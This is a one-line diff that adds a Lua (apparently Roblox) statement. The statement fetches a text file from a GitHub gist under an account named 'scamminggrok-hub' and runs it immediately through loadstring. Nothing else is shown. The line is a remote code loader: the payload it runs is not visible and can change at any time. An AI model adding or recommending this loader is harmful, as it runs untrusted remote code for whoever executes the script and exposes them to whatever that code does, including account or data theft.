@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/scamminggrok-hub/9497490b12632885b14aa33b3256437e/raw/0a325747d1b8bbfef47fe3bdfd41540cae325f50/gistfile1.txt"))()
